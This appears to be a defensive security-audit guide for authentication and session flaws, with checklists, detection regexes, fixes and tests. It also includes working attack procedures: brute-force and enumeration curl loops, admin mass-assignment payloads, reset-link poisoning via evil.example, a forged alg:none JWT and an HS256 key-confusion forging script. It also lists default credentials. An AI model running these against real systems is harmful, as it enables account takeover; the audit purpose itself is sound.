---
name: authn-session-checks
description: Detect authentication and session management failures across login, password storage, password reset, MFA, session lifecycle, JWT/OAuth/API-key handling, remember-me, and session storage.
category_slug: AUTHN
cwe: [CWE-287, CWE-384, CWE-613, CWE-620, CWE-640, CWE-307, CWE-521, CWE-798, CWE-204]
owasp: A07:2021 – Identification and Authentication Failures
---

# AuthN & Session Management Checks

## Scope & Objectives

- Audit every path that establishes identity (login, register, SSO/OAuth callback), extends it (remember-me, refresh tokens), or re-establishes it (password reset, recovery).
- Verify credentials are checked against strong one-way hashes and that sessions/tokens are issued, rotated, validated, and invalidated correctly.
- Detect enumeration, brute-force enablement, default/seeded credentials, mass assignment at registration, MFA bypasses, and JWT algorithm/validation flaws.
- Out of scope (cross-references): throttling depth and API abuse metrics -> `api.md`; object-level IDOR beyond reset-flow specifics -> `authz.md`; cookie attribute deep matrix -> `config.md`; hardcoded secret inventory -> `secrets.md`; redirect validation depth -> `ssrf.md`.

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **session**: the server-side record plus browser cookie that keeps a user logged in after one successful login
- **session fixation**: tricking a victim into using a session identifier the attacker already knows
- **credential stuffing**: replaying username/password pairs stolen from other sites against this login
- **JWT claim**: a field inside a signed token stating something like "this is user 42"; every claim must be verified, not just read
- **MFA**: a second proof of identity beyond the password (app prompt, code, hardware key)
- **enumeration**: responses that reveal whether an account exists, letting attackers harvest usernames
- **KDF**: deliberately slow password-hashing that makes offline guessing expensive
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

Authentication is a state machine; every transition must be guarded:

| Stage | Question the code must answer | Flaw class if wrong | Primary CWE |
|---|---|---|---|
| Credential verify | Is the password checked with a slow salted KDF? | Plaintext/fast-hash compare | CWE-521 |
| Attempt throttle | Are repeated failures bounded per account and per source? | Brute force / stuffing | CWE-307 |
| Identity issuance | Does successful login mint a NEW unpredictable identifier? | Fixation, predictable IDs | CWE-384 |
| Session lifetime | Do sessions expire server-side and die on logout/password change? | Never-expiring sessions | CWE-613 |
| Recovery | Can only the true owner reset via an unguessable expiring token? | Predictable/replayable reset | CWE-640 |
| Step-up | Are sensitive operations re-authenticated or MFA-gated? | MFA absent/bypassable | CWE-287 |
| Token trust | Are signature, algorithm, issuer, audience, expiry enforced? | alg:none, confusion, missing checks | CWE-287 |
| Registration | Can a caller self-assign privileged fields? | Mass assignment to admin | CWE-287 |
| Response parity | Do all auth failures look identical externally? | Enumeration | CWE-204 |

Rule of thumb: any handler reachable BEFORE authentication completes (login, register, forgot-password, OAuth callback, MFA challenge) is fully attacker-controlled input territory and receives the highest scrutiny.

## What To Check

### Login & credential verification
1. Trace the login handler end-to-end: input -> lookup -> hash compare -> response. Flag branches where "user not found" and "wrong password" differ in status code, body text, body size, or work performed.
2. Confirm failed attempts are counted server-side per account AND per source IP/device, persisted (DB/Redis), and enforced with lockout or exponential backoff.
3. Search seeders/migrations/fixtures/factories for users created with known passwords; determine whether such accounts exist in production and whether their passwords were force-expired.
4. Probe parameter pollution in login: duplicate `username`/`email` keys across query, body, and array syntax (`user[]=a&user[]=b`) reaching lookups that pick first-or-last inconsistently.
5. On register/signup, diff accepted request body keys against ORM mass-assignment allowlists (`$fillable`, `fields`, serializer `fields`, `StrongParameters`); flag `role`, `is_admin`, `admin`, `permissions`, `user_type` sourced from client input.
6. Check HTTP Basic usage: credentials from string literals, committed `.htpasswd`, or default env fallbacks.

### Password handling
1. Identify the exact verification primitive. Accept only Argon2id, bcrypt cost >= 12, scrypt, PBKDF2-HMAC-SHA256 >= 600k iterations. Flag md5/sha1/sha256-single-pass, unsalted digests, reversible encryption, custom XOR.
2. Read the policy enforcement point (validator class/regex/minLength); flag absence, min < 8 with no composition, or denylists rejecting only literal passwords.
3. Note stuffing indicators for report context: no lockout + generic failure + endpoint accepting many encodings; cross-ref API module for throttle depth.
4. Confirm comparison uses the KDF library's constant-time verifier (`bcrypt.compare`, `checkpw`, `PasswordEncoder.matches`, `password_verify`), never `==`/`===` on digest strings.

### Password reset & account recovery
1. Locate token generation. Require CSPRNG >= 128 bits (`crypto.randomBytes(32)`, `secrets.token_urlsafe(32)`, `random_bytes(32)`, `SecureRandom`, `SecureRandom.urlsafe_base64`). Flag time/email/name-derived values, `Math.random()`, `rand()`, `mt_rand()`, `uniqid()`.
2. Confirm server-side expiry (<= 60 min), hashed storage, atomic single-use consumption, revocation on reissue and on password change.
3. Trace link construction back to its host source; flag reliance on `Host`/`X-Forwarded-Host`, `req.headers.host`, `$_SERVER['HTTP_HOST']`, Django `build_absolute_uri()` bound to the request, Rails `default_url_options` merged from request.
4. In reset-consume, verify ownership comes from the token record, not a client-supplied `uid`/`userId` (flow-specific IDOR; deep matrix -> authz module).
5. Flag security questions as sole factor, plaintext answer storage, or guessable canonical answer sets.
6. Grep log/telemetry calls for reset token values being logged.

### MFA
1. Establish whether MFA exists at all; its absence on admin panels, password/email change, payouts, exports, API-key creation is itself a finding.
2. Trace TOTP provisioning/storage: secrets returned in API responses, embedded in pages/logs, stored plaintext; backup codes stored unsalted or logged.
3. Hunt "verify later"/skippable flows: `mfa_pending` session flags granting full access, alternate routes skipping the challenge, client-only gating.
4. Verify backup codes: CSPRNG generation, hashed storage, single-use consumption.
5. Verify device-remember tokens: >= 128-bit random, bounded life, hashed server-side, revoked on credential change.

### Session management
1. Login must regenerate the session identifier; compare pre-auth vs post-auth cookies (procedure below).
2. Logout must invalidate server-side (store delete / token denylist), not merely delete the client cookie.
3. Password change/reset must invalidate all sessions, refresh tokens, and remember-me devices.
4. Confirm idle and absolute timeouts enforced against the server-side store, not just cookie `maxAge`.
5. Refresh tokens: rotation on every use, bounded lifetime, revocation list; flag eternal reusable refresh tokens.
6. Check concurrent-session policy where the product claims single-session semantics.

### Token-based auth (JWT/OAuth/API keys)
1. Enumerate every jwt parse/verify call; require pinned algorithm allowlist excluding `none`, key loaded from config/Keystore (never from token headers), asserted `aud`/`iss`, expiry enforced (no `ignoreExpiration`).
2. Flag acceptance of tokens with zero signature verification (raw base64 decode -> trust claims).
3. Flag header-driven key selection: `kid` into SQL/path traversal, `jku`/`x5u` fetched over network, inline `jwk` trusted.
4. Inspect payloads for PII/secrets (password hashes, inner tokens, card data).
5. Flag tokens in query strings (`?token=`, `access_token=`) leaking into logs/Referer.
6. OAuth: flag implicit flow (`response_type=token`), missing or non-compared `state`, `redirect_uri` prefix-matched or unmatched (depth -> ssrf module).
7. Static API keys shipped in frontend/mobile bundles performing per-user actions -> evidence here, inventory -> secrets module.

### Remember-me / persistent login
1. Require random >= 128-bit series/token pairs stored hashed; flag `md5(username)`, `sha1(password_hash)` derivatives, sequential integers.
2. Confirm independent invalidation on logout-all and password change.

### Session storage backends
1. Express default MemoryStore: dev-only; production requires connect-redis/connect-mongo/equivalent.
2. Django signed-cookie sessions: payload readable by clients; flag sensitive objects in `request.session`.
3. Flask/itsdangerous cookie sessions: weak/committed `SECRET_KEY` enables forgery (key sourcing -> secrets module); PyJWT same trust model for HS256 shared secrets.
4. PHP: `session.save_path` permissions; `session_regenerate_id(true)` on privilege change.

## Where To Look

### Path globs

| Glob pattern | What to find |
|---|---|
| `**/*login*`, `**/*signin*`, `**/auth/**`, `**/sessions/**` | Login/logout handlers, controllers |
| `**/passport*.{js,ts}`, `**/strategies/**` | passport.js verify callbacks |
| `**/*jwt*.{js,ts,py,java,kt,go,cs}`, `**/*token*` | Token issue/verify points |
| `**/seed*`, `**/seeds/**`, `**/fixtures/**`, `**/factories/**`, `**/db/migrate/**`, `**/migrations/**` | Seeded users, default passwords |
| `**/middleware/**`, `**/filters/**`, `**/interceptors/**` | Auth middlewares and their ordering |
| `**/{SecurityConfig,WebSecurityConfig,Startup,Program}.{java,kt,cs}`, `**/settings.py`, `**/config/**` | Framework auth/session configuration |
| `**/config/initializers/devise.rb`, `**/models/user.rb`, `**/models/user.py` | Devise config, `has_secure_password` |
| `**/*reset*`, `**/*forgot*`, `**/*recover*`, `**/*mfa*`, `**/*totp*`, `**/*otp*` | Reset and MFA flows |
| `templates/**/*.html`, `**/views/**`, `**/*.tsx` | Reset links/tokens rendered client-side |

### Framework marker matrix

| Framework | Marker of weakness | Correct pattern |
|---|---|---|
| Express + passport.js | `session({secret:'s'})` without `store`; manual `user.password === req.body.password`; no `req.session.regenerate` on login | Redis/Mongo store; `bcrypt.compare` in strategy; `req.session.regenerate()` before setting user |
| jsonwebtoken (Node) | `jwt.decode()` feeding authorization; `jwt.verify(t,key)` with no options object | `jwt.verify(token, publicKey, {algorithms:['RS256'], audience, issuer})` |
| Django | `MD5PasswordHasher` active in `PASSWORD_HASHERS`; `SESSION_COOKIE_SECURE = False`; reset view trusting POSTed `uid` | `Argon2PasswordHasher` first; DB/cache session engine; ownership resolved from token record only |
| Flask / Flask-Login | `app.secret_key = 'dev'`; roles trusted from session cookie | 32+ byte random secret from env/vault; roles loaded from DB per request |
| Spring Security (Java/Kotlin) | `NoOpPasswordEncoder.getInstance()`; disabled sessionFixation; `csrf().disable()` alongside cookie auth | `DelegatingPasswordEncoder` + BCrypt(12); default changeSessionId fixation protection enabled |
| ASP.NET Core Identity | `RequiredLength = 4`; multi-year cookie `ExpireTimeSpan`; hand-rolled cookie auth replacing Identity | Default password options; bounded `ExpireTimeSpan`; reviewed `SlidingExpiration` |
| Laravel (PHP) | `Hash::make($pw, ['rounds' => 6])`; short `Str::random(n)` reset tokens; `$fillable` containing `role` | Default bcrypt (raise to 12); `Str::random(40)`; `$guarded = ['role','is_admin']` |
| Raw PHP sessions | `md5($_POST['pw']) == $row['hash']`; no `session_regenerate_id` after login | `password_verify()` / `password_hash(PASSWORD_DEFAULT)`; `session_regenerate_id(true)` |
| Rails (devise / has_secure_password) | plaintext column instead of `has_secure_password`; custom reset finder trusting params; naive remember token | `has_secure_password` or Devise defaults (`reset_password_within = 6.hours`); `generate_unique_secure_token` |
| Go (gorilla/sessions, stdlib) | `crypto/md5` on passwords; literal `[]byte("secret")` CookieStore key; cookies without MaxAge/Secure | `bcrypt.GenerateFromPassword(pw, 12)`; 32-byte random key; full cookie attribute set |
| OAuth (any stack) | callback reads `code` without comparing `state`; `response_type=token` | per-login server-stored `state` compared constant-time; authorization-code flow + PKCE |

## Patterns & Signatures

All regexes are ripgrep-compatible (no lookarounds). Hits are leads requiring manual confirmation.

Weak or fast password hashing:
```regex
(hashlib\.(md5|sha1)\(|Digest::MD5|digest::md5|crypto\.createHash\(["'](md5|sha1)["']\)|hash\(["'](md5|sha1)["'],|(MD5|SHA1)PasswordHasher|NoOpPasswordEncoder|MessageDigest\.getInstance\("MD5"\)|password.*encrypt|encrypt.*password)
```

Low KDF cost / fast parameters (manual-check the numbers found):
```regex
(genSalt(Sync)?\(\s*([0-9]|1[01])\s*[,)]|BCryptPasswordEncoder\(\s*(\d|10|11)\s*\)|rounds\s*[:=]\s*([0-9]|10|11)\b|Cost\s*=\s*(\d|10|11)\b|pbkdf2:sha256:[1-5]?[0-9]{1,5}|iterations\s*[:=]\s*[1-5]?[0-9]{1,5}\b)
```

Default / seeded credentials:
```regex
(["'](admin|root|administrator|superuser|demo|test|sa)[\"']\s*[:,=]\s*["'](admin|admin123|root|toor|password|password1|Passw0rd!|123456|12345678|changeme|changeit|letmein|qwerty|secret)["'])
```

Enumeration-leaking messages:
```regex
(["'](User|Email|Account)[^"']{0,20}(not found|does not exist|unknown|no such)|invalid username|email not registered|no account (with|matches))
```

Weak reset-token generation:
```regex
(Math\.random\(\).{0,60}token|token.{0,60}Math\.random\(\)|uniqid\(|mt_rand\(|\brand\(\d|randint\(|Date\.now\(\)\.toString\(36\)|(md5|sha1)\((time|microtime|now|email)))
```

Reset-token lifecycle fields (presence audit; pair with manual expiry/single-use review):
```regex
(reset_password_token|password_reset_token|resetToken|resetRequestedAt|reset_sent_at|reset_expires|tokenExpiry|used_at)
```

JWT misuse:
```regex
(jwt\.decode\(|JWT\.decode\(|decode\(\s*(jwt|token)|algorithms?\s*[:=]\s*\[?\s*["']none["']|ignoreExpiration\s*:\s*true|ignoreNotBefore\s*:\s*true|"alg"\s*:\s*"[Nn]one")
```

Key-selection injection surface (kid/jku/x5u/jwk):
```regex
(header\.kid|\bkid\b\s*[:=]|header\.jku|x5u|header\.jwk|getPublicKey(kid|ById))
```

OAuth gaps:
```regex
(response_type=token|response_type["']?\s*[:=]\s*["']token|state\s*[:=]\s*(null|None|""|'')|oauth/callback|redirect_uri=)
```

Session misconfiguration:
```regex
(saveUninitialized\s*:\s*true|MemoryStore|maxAge\s*:\s*(365|30)\s*\*\s*24|SESSION_COOKIE_SECURE\s*=\s*False|cookie_secure\s*=\s*False|httponly\s*[:=]\s*[Ff]alse|secret_key\s*=\s*["'][^"']{0,20}["'])
```

Remember-me / persistent login:
```regex
(remember[_-]?me|RememberMe|auto_login|persistent_login|series:token|auth_token\s*[:=])
```

Tokens in URLs / basic auth embedded in code:
```regex
([?&](token|jwt|access_token|reset_password_token)=|Basic\s+[A-Za-z0-9+/=]{12,}|Authorization["']?\s*[:,=]\s*["']Basic )
```

MFA presence audit (absence of hits near sensitive routes is itself a finding):
```regex
(totp|mfa|two_factor|2fa|otp_secret|backup_code|recovery_code|mfa_required)
```

## Taint Tracing Guidance

| Source (attacker-controlled) | Sink (security decision) | Flaw to confirm |
|---|---|---|
| Login body `username`/`email` | Response body/status branches | Enumeration (CWE-204) |
| Failed-attempt counter keyed on IP only | Lockout state | Distributed brute force survives (CWE-307) |
| Signup body -> ORM create/update | `users.role` / `users.is_admin` columns | Mass assignment to admin (CWE-287) |
| `Math.random()` / time-derived value | Reset token persisted + emailed | Predictable recovery token (CWE-640) |
| `Host` / `X-Forwarded-Host` header | Email link builder | Reset-link host poisoning (CWE-640) |
| Client-supplied `uid` in reset-consume | Token ownership check | Cross-user reset (IDOR-in-reset) |
| JWT header `kid`/`jku`/`jwk`/`x5u` | Verification key selection | Attacker-signed tokens (log under CWE-287) |
| Decoded JWT claims (`role`,`sub`) | Authorization checks | Unverified-token trust (CWE-287) |
| OAuth callback query (`code`,`state`) | Session establishment | Login CSRF via missing state binding |
| Weak/committed `SECRET_KEY` | Flask/itsdangerous/JWT HS256 signing | Session/token forgery (cross-ref secrets module) |

Method: start from the route table (Express routers, Django `urls.py`, Rails `routes.rb`, Spring `@RequestMapping`, Go `http.HandleFunc`), classify every unauthenticated route, then follow arguments into the sinks above. For mass assignment, dump model allowlists (`$fillable`, `fields`, `StrongParameters`) and diff against signup controller inputs. For reset flows, walk generate -> persist -> email -> consume and annotate where attacker data can substitute for each stage.

## Exploitation & Reproduction

Run only against systems you are authorized to test. Each procedure lists expected observable outcomes.

### 1. Username enumeration via response diffing
1. Unknown user:
   ```bash
   curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
     -X POST https://target/login -H 'Content-Type: application/json' \
     -d '{"username":"definitely-not-a-user","password":"WrongPass1!"}'
   ```
2. Known/likely user (from seeds or signup):
   ```bash
   curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
     -X POST https://target/login -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"WrongPass1!"}'
   ```
3. Expected outcome if vulnerable: differing status (200 vs 401), body-size delta > ~50 bytes, or distinct messages ("No such user" vs "Invalid password"). Capture 3 samples per class into a diff table for the report.

### 2. Timing-based enumeration
1. When messages match, run 10 requests per class recording `%{time_total}`.
2. Expected outcome if vulnerable: known-user median consistently higher (KDF executed) vs unknown-user fast-path; stable gap across runs. Single-run jitter is not evidence; require repeated medians.

### 3. Missing rate limiting / lockout
1. Fire 30 wrong-password attempts:
   ```bash
   for i in $(seq 1 30); do curl -s -o /dev/null -w '%{http_code} ' \
     -X POST https://target/login -H 'Content-Type: application/json' \
     -d '{"username":"victim","password":"bad-'$i'"}'; done; echo
   ```
2. Expected outcome if vulnerable: uniform 401s, no 429/423, and the correct password still succeeds immediately afterwards. Depth of throttle tuning -> api module.

### 4. Default / seeded credentials
1. Collect candidates from grep hits and README quickstarts: `admin:admin`, `admin:password`, `root:root`, demo accounts.
2. Attempt each login. Expected outcome if vulnerable: success + `Set-Cookie`; confirm elevated role via `/api/me`.

### 5. Mass assignment at registration
1. Register normally; note your id from `/api/me`.
2. Inject privilege fields:
   ```bash
   curl -s -X POST https://target/api/register -H 'Content-Type: application/json' \
     -d '{"email":"attacker@example.com","password":"Str0ngPass!xyz","role":"admin"}'
   ```
   Variants: `{"isAdmin":true}`, `{"user_type":0}`, duplicate key `"role":"user","role":"admin"` (pollution), form-encoded `role=admin` alongside JSON.
3. Expected outcome if vulnerable: `/api/me` shows `role:"admin"`; a previously forbidden admin endpoint now returns data.

### 6. Password reset host-header poisoning
1. Request reset with overridden host:
   ```bash
   curl -s -X POST https://target/auth/forgot -H 'Host: evil.example' \
     -H 'Content-Type: application/json' -d '{"email":"victim@corp.com"}'
   curl -s -X POST https://target/auth/forgot -H 'X-Forwarded-Host: evil.example' \
     -H 'Content-Type: application/json' -d '{"email":"victim@corp.com"}'
   ```
2. Expected outcome if vulnerable: emailed link begins `https://evil.example/reset?...`. Without inbox access, confirm statically that the link host derives from request headers.

### 7. Reset token replay / non-expiry
1. Request two resets on an authorized account; use the FIRST token after the SECOND was issued.
2. Consume a token successfully, then submit it again.
3. Expected outcome if vulnerable: superseded token still accepted, or second acceptance succeeds. Absence of expiry/single-use columns in the migration is corroborating static evidence.

### 8. JWT alg:none swap
1. Log in; capture `Authorization: Bearer <token>`.
2. Forge with header `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` (`{"alg":"none","typ":"JWT"}`), payload `eyJzdWIiOiIxMDA3IiwiaWF0IjoxNzUwMDAwMDAwLCJyb2xlIjoiYWRtaW4iLCJzY29wZSI6InByb2ZpbGUifQ` (`{"sub":"1007","iat":1750000000,"role":"admin","scope":"profile"}`), empty signature:
   ```bash
   FORGED='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDA3IiwiaWF0IjoxNzUwMDAwMDAwLCJyb2xlIjoiYWRtaW4iLCJzY29wZSI6InByb2ZpbGUifQ.'
   curl -s https://target/api/admin/users -H "Authorization: Bearer $FORGED"
   ```
3. Retry with capital-N header `eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0` and with trailing-dot removed.
4. Expected outcome if vulnerable: 200 with protected data. A 401 means the library rejected `none`; record as pass.

### 9. RS256 -> HS256 algorithm confusion
1. Preconditions: server verifies with a public key obtainable by the attacker (JWKS endpoint, repo PEM).
2. Sign original header/payload segments with HMAC-SHA256 keyed by the raw public-key PEM bytes:
   ```bash
   TOKEN='<original RS256 token>'
   HDR=$(printf %s "$TOKEN" | cut -d. -f1); PL=$(printf %s "$TOKEN" | cut -d. -f2)
   SIG=$(printf '%s.%s' "$HDR" "$PL" | openssl dgst -binary -sha256 -mac HMAC \
         -macopt key:"$(cat server_public.pem)" | base64 | tr '+/' '-_' | tr -d '=')
   FORGED="$HDR.$PL.$SIG"
   curl -s https://target/api/me -H "Authorization: Bearer $FORGED"
   ```
3. Expected outcome if vulnerable: 200 — verifier selected HS256 from the header and used the public key as HMAC secret.

### 10. Expiry / issuer / audience not validated
1. Replay a token captured before its `exp` passed (or shorten test window by requesting tokens with short ttl).
2. Replay a token minted for one audience (`web://client`) against another service (`api://orders`).
3. Expected outcome if vulnerable: stale or cross-audience token accepted (200). Statically corroborate: verify call lacks `audience`/`issuer` options or sets `ignoreExpiration:true`.

### 11. OAuth callback CSRF (missing state)
1. Start an OAuth login; copy the provider redirect URL; remove the `state` parameter.
2. Complete the flow in a second browser session using only `https://target/auth/callback?code=<code>`.
3. Expected outcome if vulnerable: callback accepts stateless code -> attacker binds their provider account to the victim's target session (login CSRF).

### 12. Session fixation sequence
1. Anonymous visit, record cookie:
   ```bash
   curl -si -c jar.txt https://target/ ; grep -i sid jar.txt
   ```
2. Authenticate reusing the same jar:
   ```bash
   curl -si -b jar.txt -c jar.txt -X POST https://target/login \
     -d 'username=u&password=p' >/dev/null; grep -i sid jar.txt
   ```
3. Expected outcome if secure: post-login session id DIFFERS from pre-auth id. Identical id = CWE-384: anyone who planted the pre-auth value owns the authenticated session.

### 13. Logout without server-side invalidation
1. Log in, save cookie C1, then `curl -X POST https://target/logout -b C1`.
2. Replay C1 against an authenticated endpoint:
   ```bash
   curl -s -o /dev/null -w '%{http_code}\n' https://target/api/profile -b C1.jar
   ```
3. Expected outcome if vulnerable: 200 after logout. Repeat after password change to test CWE-620/CWE-613 combined.

### 14. MFA skip via direct route / "verify later"
1. Submit correct password but stop before OTP entry; note the pending-state cookie.
2. Immediately call a sensitive endpoint directly:
   ```bash
   curl -s https://target/api/payments -b mfa_pending.jar
   ```
3. Expected outcome if vulnerable: data returned pre-MFA; client JS contains a skip branch unlocking navigation without server verification.

### 15. Cookie attribute inspection
```bash
curl -si https://target/login | grep -iE '^set-cookie.*(httponly|secure|samesite)'
```
Expected finding if weak: session cookie missing HttpOnly/Secure/SameSite, or `SameSite=None` without Secure. Deep matrix -> config module.

### Static-only confirmation guidance
- With no runtime, grade from code: cite file:line for the verify call, quote the full login handler to show regeneration absence, cite token generator line, show middleware ordering proving sensitive routes mount outside `requireMfa`.
- Reproduce forgery offline: build the alg:none string locally and include it as evidence; phrase findings as "static confirmation; live acceptance untested".
- For enumeration, present both response-building code paths side-by-side in place of measured diffs.

## Remediation

### Login throttling & enumeration
- Uniform failure: always run the hash comparison (dummy compare when user missing); return identical status, body shape, and delay.
- Throttle per-account and per-source with exponential backoff; use maintained libraries (`express-rate-limit` + `rate-limiter-flexible`, Django `django-axes`, ASP.NET `LockoutOptions.Enabled = true`, Spring custom `AuthenticationFailureHandler` + counters). Tuning depth -> api module.

```js
// VULNERABLE
const u = await db.users.findByEmail(email);
if (!u) return res.status(404).json({error: 'User not found'});
if (!(await bcrypt.compare(pw, u.password))) return res.status(401).json({error: 'Wrong password'});
// FIXED
const DUMMY_HASH = await bcrypt.hash('timing-equalizer', 12); // computed once at boot
const u = await db.users.findByEmail(email);
const ok = u ? await bcrypt.compare(pw, u.password) : await bcrypt.compare(pw, DUMMY_HASH);
if (!u || !ok) return res.status(401).json({error: 'Invalid credentials'});
```

### Password storage
| Algorithm | Minimum parameters (OWASP Password Storage guidance) |
|---|---|
| Argon2id | memory 19 MiB (19456 KiB), iterations 2, parallelism 1; scale up hardware permitting |
| bcrypt | cost 12+ (~250 ms on server-class core) |
| scrypt | N=2^17, r=8, p=1 |
| PBKDF2-HMAC-SHA256 | 600,000 iterations |

```js
// VULNERABLE
const hash = crypto.createHash('sha256').update(password).digest('hex');
// FIXED
const argon2 = require('argon2');
const hash = await argon2.hash(password, {type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1});
```
Enforce server-side policy: length >= 12 preferred (or >= 8 with composition), breached-password denylist, no forced periodic rotation. Migrate by wrapping legacy hashes and rehashing on next successful login.

Breached-password screening concretely: query the Have I Been Pwned k-anonymity range API (`GET https://api.pwnedpasswords.com/range/{first 5 chars of SHA-1}`) server-side at registration and password change, comparing the full SHA-1 of the candidate; block matches, never send the full password off-host. Allow paste into password fields — blocking paste pushes users toward weaker memorable passwords and breaks password managers. Give users visibility into their active sessions with per-session terminate buttons; unexplained sessions are both a user-facing control and a detection signal.

### Session regeneration per stack
| Stack | Call at login / privilege change |
|---|---|
| Express | `await new Promise(r => req.session.regenerate(r))` then set user claims |
| Django | `request.session.cycle_key()` before setting auth state |
| PHP | `session_regenerate_id(true);` |
| Rails / Devise | `reset_session` then re-establish (Devise does this inside `sign_in`) |
| Spring Security | default session-fixation protection calls `changeSessionId()`; keep it enabled, do not disable |
| Go (gorilla/sessions) | no built-in rotate: destroy old session record, create fresh one, copy minimal claims |
| ASP.NET Core | `SignInManager.PasswordSignInAsync` rotates the cookie; for custom auth issue a new ticket and clear the old cookie |

Logout must be server-authoritative: delete store entry (`req.session.destroy(cb)`, `session_destroy()`, `request.getSession().invalidate()`), clear cookie, and on password change/reset invalidate every session, refresh token, remember-me device, and outstanding reset token.

### Password reset tokens
```js
// VULNERABLE
const token = Math.random().toString(36).slice(2) + Date.now();
// FIXED
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('base64url');            // 256-bit, emailed once
const tokenHash = crypto.createHash('sha256').update(token).digest();  // store hash, never raw token
await db.query(
  'UPDATE users SET reset_token_hash=?, reset_expires=NOW()+INTERVAL 15 MINUTE WHERE email=?',
  [tokenHash, email]);
// consumption: single atomic statement guarantees single-use + expiry
// UPDATE users SET reset_token_hash=NULL, reset_expires=NULL, password_version=password_version+1
//   WHERE email=? AND reset_token_hash=? AND reset_expires > NOW()
```
Build links from a server-configured base URL (`APP_BASE_URL`), never request headers. Rate-limit issuance and notify users of resets. Ownership in the consume step must resolve through the token record only.

### MFA enforcement point
```js
// FIXED: gate AFTER credential success, BEFORE any privileged route mounts
function requireMfa(req, res, next) {
  if (!req.session.userId) return res.redirect('/login');
  if (req.session.mfaPending && !req.session.mfaVerified) return res.redirect('/mfa/challenge');
  next();
}
router.use(requireMfa);
router.post('/payments', handlers.payments);
router.get('/admin', handlers.admin);
```
Encrypt TOTP secrets at rest; hash backup codes with the password KDF and mark used codes atomically; device-trust cookies need >= 128-bit CSPRNG values, hashed server-side, <= 30-day life, revoked on password change. Enforce MFA server-side on admin panels, credential changes, payouts/exports, API-key creation.

### JWT validation (pinned algorithms + audience)
```js
// VULNERABLE
const payload = jwt.decode(token); // zero verification
// also bad:
jwt.verify(token, secret, {ignoreExpiration: true});
jwt.verify(token, keyFromTokenHeader.kid); // attacker-selected key
// FIXED
const payload = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],                    // pinned allowlist; 'none' can never pass
  audience: 'api://orders',
  issuer: 'https://idp.corp.example',
  clockTolerance: 30,
});
if (!payload.scope || !payload.scope.includes('orders:read')) throw new ForbiddenError();
```
Python equivalent: `pyjwt.decode(token, key, algorithms=['RS256'], audience='api://orders', issuer='https://idp.corp.example')`. Never fetch keys from token-supplied URLs; resolve `kid` against a local JWKS allowlist only.

### OAuth & refresh tokens
- Authorization-code flow with PKCE; generate per-login random `state`, verify equality before exchanging `code`; exact-match `redirect_uri` registration.
- Refresh tokens: rotate on each use (invalidate predecessor), detect reuse-of-rotated-token as theft signal, bound absolute lifetime, revoke on logout/password change.
- Reject `response_type=token` implicit flows for new integrations.

### Defense-in-depth
- Add login anomaly alerts (velocity per account/IP) to monitoring, not just blocking.
- Re-authenticate (password or MFA step-up) immediately before password/email change and payout actions.
- Sign and short-life all bearer tokens; keep authorization decisions out of client-trusted claims without server-side re-check.
- Documented runbook: force-logout-all endpoint per user for incident response.
- Passwordless/FIDO2 hardware-key adoption: point factor-upgrade migration guidance at WebAuthn/passkey rollout paths (phishing-resistant, defeats AiTM kit collection).
- OAuth-consent-abuse and stolen-OAuth-token detection techniques live in the SSO module (oauth-sso) — cross-ref rather than duplicating here.

## Verification & Validation

### GIVEN/WHEN/THEN tests
- GIVEN lockout threshold 5 WHEN 6 wrong passwords THEN 429/locked response AND GIVEN correct password during lockout THEN access is still denied (negative test).
- GIVEN valid credentials WHEN login THEN 200, new session id != pre-auth id, old pre-auth id rejected afterwards.
- GIVEN unknown username vs known username WHEN same wrong password THEN identical status code, body length within noise, comparable latency.
- GIVEN forged alg:none token THEN 401/invalid AND GIVEN legitimate RS256 token THEN 200 (regression guard that hardening did not break valid auth).
- GIVEN expired token or cross-audience token THEN rejected; GIVEN fresh correctly-audience token THEN accepted.
- GIVEN consumed reset token WHEN replayed THEN rejected; GIVEN superseded token (after newer reset request) THEN rejected; GIVEN password just changed WHEN prior session cookie replayed THEN 401.
- GIVEN MFA-pending session WHEN calling sensitive route THEN challenge/redirect, never data.
- GIVEN remember-me token WHEN reviewed statically THEN >= 128-bit CSPRNG origin confirmed and stored only as hash.

### Regression pseudocode
```text
test_login_uniformity():
  r1 = POST /login {user:"ghost-user", pass:"Xy9!"}; r2 = POST /login {user:"admin", pass:"Xy9!"}
  assert r1.status == r2.status and abs(len(r1.body)-len(r2.body)) < 20
test_session_rotation():
  sid1 = GET / -> Set-Cookie SID; sid2 = POST /login(cookie=sid1)
  assert sid1 != sid2 and GET /me with sid1 -> unauthenticated
test_jwt_negative_then_positive():
  assert verify(forged_alg_none) raises InvalidAlgorithmError
  assert verify(expired_token)   raises ExpiredSignatureError
  assert verify(valid_token)     returns payload          # negative-test regression
test_reset_single_use():
  t = request_reset(); consume(t); assert consume(t) fails
```

### Manual re-test checklist
1. Re-run enumeration diff capture: statuses and sizes now match across user classes.
2. Confirm Set-Cookie changes across login, logout, password change.
3. Replay captured pre-fix forged JWTs; confirm rejection while a freshly issued token works.
4. Request two resets; confirm older token dead; confirm link host is the configured domain even with spoofed Host header.
5. Walk MFA-pending state directly into a protected route; confirm challenge enforced server-side.

### Greps to rerun post-fix (expect no production hits)
```bash
rg -n "NoOpPasswordEncoder|MD5PasswordHasher|SHA1PasswordHasher" src/
rg -n "algorithms?\s*[:=]\s*\[?\s*[\"']none[\"']|ignoreExpiration\s*:\s*true" src/
rg -n "Math\.random\(\).{0,60}token|uniqid\(" src/
rg -n "\[\s*[\"'](role|is_admin)[\"']\s*,\s*[\"'](is_admin|role)[\"']\s*\]" app/ models/
rg -n "secret_key\s*=\s*[\"'][^\"']{0,20}[\"']" .
```

## Severity Assessment

| Finding | CWE | Default rating | Example CVSS v3.1 vector |
|---|---|---|---|
